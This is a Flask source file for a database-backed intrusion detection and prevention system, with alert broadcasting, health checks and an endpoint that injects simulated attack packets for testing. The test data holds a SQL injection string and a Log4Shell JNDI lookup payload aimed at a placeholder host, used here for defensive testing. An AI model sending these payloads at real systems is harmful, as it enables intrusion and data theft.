"""
app.py — Core Flask REST API, GraphQL & WebSocket Gateway for DB-IDS/IPS.
Optimized for multi-version Python compatibility (uses standard threading mode).
Includes graceful fallback if Redis or MongoDB are not yet started.
"""

import os
import smtplib
import sys
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(Path(__file__).resolve().parents[1] / ".env", override=False)

# Ensure self-referential imports from routes resolve to this exact running module instance
sys.modules["app"] = sys.modules[__name__]
import logging
from datetime import datetime
from flask import Flask, jsonify, render_template
from flask_cors import CORS
from flask_socketio import SocketIO
from flask_jwt_extended import JWTManager, jwt_required
from flask_sqlalchemy import SQLAlchemy
from pymongo.errors import PyMongoError
from redis.exceptions import RedisError
from sqlalchemy import text
from sqlalchemy.exc import SQLAlchemyError

from config import Config
from email_notifications import missing_email_settings, send_alert_email, should_email_alert

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [API] %(message)s")
logger = logging.getLogger("API")

# -----------------------------------------------------------------------------
# Extensions & Connections
# -----------------------------------------------------------------------------
app = Flask(__name__)
app.config.from_object(Config)

CORS(app, resources={r"/*": {"origins": "*"}})
jwt = JWTManager(app)
db = SQLAlchemy(app)
with app.app_context():
    with db.engine.connect():
        logger.info("Connected to the configured SQL database.")

# Use standard thread-safe async mode (compatible across all Python versions)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

_missing_email_settings = missing_email_settings()
if _missing_email_settings:
    logger.warning(
        "High/critical email notifications are disabled; configure: %s",
        ", ".join(_missing_email_settings),
    )
else:
    logger.info("High/critical email notifications are enabled.")

from pymongo import MongoClient

mongo_client = MongoClient(
    app.config.get("MONGO_URI", "mongodb://localhost:27017"),
    serverSelectionTimeoutMS=5000,
)
mongo_client.admin.command("ping")
mongo_db = mongo_client[app.config.get("MONGO_DB", "idsips")]
logger.info("Connected to MongoDB.")

import redis

redis_client = redis.Redis.from_url(
    app.config.get("REDIS_URL", "redis://localhost:6379/0"),
    decode_responses=True,
    socket_timeout=5,
)
redis_client.ping()
logger.info("Connected to Redis.")

# -----------------------------------------------------------------------------
# Register Route Blueprints
# -----------------------------------------------------------------------------
from routes.auth import auth_bp
from routes.rules import rules_bp
from routes.alerts import alerts_bp, incidents_bp
from routes.playbooks import playbooks_bp
from routes.threats import threats_bp
from routes.sessions import sessions_bp
from routes.forensics import forensics_bp
from routes.compliance import compliance_bp
from routes.stats import stats_bp
from routes.nosql import nosql_bp

app.register_blueprint(auth_bp)
app.register_blueprint(rules_bp)
app.register_blueprint(alerts_bp)
app.register_blueprint(incidents_bp)
app.register_blueprint(playbooks_bp)
app.register_blueprint(threats_bp)
app.register_blueprint(sessions_bp)
app.register_blueprint(forensics_bp)
app.register_blueprint(compliance_bp)
app.register_blueprint(stats_bp)
app.register_blueprint(nosql_bp)

# -----------------------------------------------------------------------------
# WebSocket Background Broadcaster
# -----------------------------------------------------------------------------
def background_alert_emitter():
    """Polls database for fresh alerts and active sessions, pushing to UI."""
    from sqlalchemy import text
    import time
    last_alert_id = 0
    last_session_id = 0
    with app.app_context():
        email_last_alert_id = db.session.execute(
            text("SELECT COALESCE(MAX(id), 0) FROM alerts")
        ).scalar_one()
    while True:
        try:
            with app.app_context():
                email_alerts = []
                with db.engine.connect() as conn:
                    # 1. Fetch fresh threat alerts
                    alerts = conn.execute(
                        text("SELECT id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, created_at FROM alerts WHERE id > :lid ORDER BY id ASC LIMIT 10"),
                        {"lid": last_alert_id}
                    ).fetchall()
                    for r in alerts:
                        alert_dict = {
                            "id": r[0], "rule_type": r[1], "severity": r[2],
                            "src_ip": str(r[3]), "dst_ip": str(r[4]), "src_port": r[5],
                            "dst_port": r[6], "protocol": r[7], "created_at": str(r[8])
                        }
                        last_alert_id = max(last_alert_id, r[0])
                        socketio.emit("new_alert", alert_dict)
                        if r[0] > email_last_alert_id:
                            email_last_alert_id = r[0]
                            if should_email_alert(alert_dict) and not _missing_email_settings:
                                email_alerts.append(alert_dict)

                    # 2. Fetch fresh network traffic sessions (websites, DNS, browsing)
                    sessions = conn.execute(
                        text("SELECT id, src_ip, dst_ip, src_port, dst_port, protocol, bytes_sent, last_seen_at FROM sessions WHERE id > :lsid ORDER BY id ASC LIMIT 25"),
                        {"lsid": last_session_id}
                    ).fetchall()
                    for s in sessions:
                        sess_dict = {
                            "id": s[0], "src_ip": str(s[1]), "dst_ip": str(s[2]),
                            "src_port": s[3], "dst_port": s[4], "protocol": s[5],
                            "bytes": s[6], "time": str(s[7])
                        }
                        last_session_id = max(last_session_id, s[0])
                        socketio.emit("new_session", sess_dict)

                    # 3. Emit summary counts
                    counts = conn.execute(
                        text("""
                            SELECT
                                (SELECT COUNT(*) FROM alerts WHERE created_at >= NOW() - INTERVAL '24 hours'),
                                (SELECT COUNT(*) FROM blocked_ips WHERE active = true),
                                (SELECT COUNT(*) FROM sessions WHERE last_seen_at >= NOW() - INTERVAL '15 minutes')
                        """)
                    ).fetchone()
                    if counts:
                        socketio.emit("stats_update", {
                            "alerts_today": counts[0],
                            "blocked_ips": counts[1],
                            "active_sessions": counts[2]
                        })
                for alert in email_alerts:
                    try:
                        send_alert_email(alert)
                    except (smtplib.SMTPException, OSError, ValueError, RuntimeError) as exc:
                        logger.exception(
                            "Could not email alert %s; it remains available in the dashboard: %s",
                            alert["id"],
                            exc,
                        )
        except Exception:
            logger.exception("Failed to publish database-backed dashboard updates")
        socketio.sleep(1)

socketio.start_background_task(background_alert_emitter)

# -----------------------------------------------------------------------------
# Web Dashboard & Health Check Endpoints
# -----------------------------------------------------------------------------
@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/health", methods=["GET"])
def health():
    from sqlalchemy import text

    components = {}
    try:
        with db.engine.connect() as conn:
            conn.execute(text("SELECT 1"))
        components["postgres"] = "UP"
    except SQLAlchemyError:
        logger.exception("PostgreSQL readiness check failed")
        components["postgres"] = "DOWN"

    try:
        mongo_client.admin.command("ping")
        components["mongodb"] = "UP"
    except PyMongoError:
        logger.exception("MongoDB readiness check failed")
        components["mongodb"] = "DOWN"

    try:
        redis_client.ping()
        components["redis"] = "UP"
    except RedisError:
        logger.exception("Redis readiness check failed")
        components["redis"] = "DOWN"

    ready = all(status == "UP" for status in components.values())
    return jsonify({
        "status": "UP" if ready else "DOWN",
        "service": "DB-IDS/IPS API",
        "database_backend": "PostgreSQL",
        "components": components,
        "timestamp": datetime.utcnow().isoformat()
    }), (200 if ready else 503)

# -----------------------------------------------------------------------------
# In-App Threat Simulation Endpoint (For 1-Click Browser UI Testing)
# -----------------------------------------------------------------------------
@app.route("/api/simulate/<attack_type>", methods=["POST"])
@jwt_required()
def simulate_attack(attack_type):
    """Allows testing database triggers directly from the UI without terminal commands."""
    from sqlalchemy import text
    source_ips = {
        "sqli": "198.51.100.189",
        "log4shell": "198.51.100.190",
        "portscan": "198.51.100.191",
        "sshbrute": "198.51.100.192",
    }
    src_ip = source_ips.get(attack_type, "198.51.100.193")
    dst_ip = "192.0.2.10"

    if attack_type == "sqli":
        packets = [
            (src_ip, dst_ip, 49200, 80, "TCP", "PSH,ACK", "UNION SELECT username, password FROM users --")
        ]

    elif attack_type == "log4shell":
        packets = [
            (src_ip, dst_ip, 51230, 8080, "TCP", "PSH,ACK", "${jndi:ldap://example.invalid/x}")
        ]

    elif attack_type == "portscan":
        packets = [
            (src_ip, dst_ip, 55100, port, "TCP", "SYN", "")
            for port in range(10000, 10015)
        ]

    elif attack_type == "sshbrute":
        packets = [
            (src_ip, dst_ip, 58120 + attempt, 22, "TCP", "SYN", "")
            for attempt in range(5)
        ]

    elif attack_type == "benign":
        packets = [
            ("192.0.2.11", "142.250.190.46", 52310, 443, "TCP", "ACK", ""),
            ("192.0.2.11", "140.82.121.3", 52312, 443, "TCP", "ACK", ""),
            ("192.0.2.11", "8.8.8.8", 53421, 53, "UDP", "", ""),
        ]

    elif attack_type == "canary":
        with db.engine.begin() as conn:
            conn.execute(text("SELECT * FROM canary_aws_admin_vault"))
        return jsonify({"success": True, "message": "Canary token query detected! Insider threat alert recorded in database!"})

    else:
        return jsonify({"error": "Unknown attack type"}), 400

    with db.engine.begin() as conn:
        for packet in packets:
            conn.execute(
                text("""
                    INSERT INTO ingress_packets
                        (src_ip, dst_ip, src_port, dst_port, protocol, tcp_flags,
                         packet_length, payload_text, payload_bytes, capture_source)
                    VALUES
                        (:src_ip, :dst_ip, :src_port, :dst_port, :protocol, :tcp_flags,
                         :packet_length, :payload_text, :payload_bytes, 'simulation')
                """),
                {
                    "src_ip": packet[0],
                    "dst_ip": packet[1],
                    "src_port": packet[2],
                    "dst_port": packet[3],
                    "protocol": packet[4],
                    "tcp_flags": packet[5],
                    "payload_text": packet[6],
                    "payload_bytes": packet[6].encode("utf-8"),
                    "packet_length": len(packet[6].encode("utf-8")) + 40,
                },
            )

    return jsonify({"success": True, "message": f"{attack_type} packets submitted for PostgreSQL processing."})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 1234))
    logger.info("API listening on port %s; use the HTTPS dashboard gateway on port 8443.", port)
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
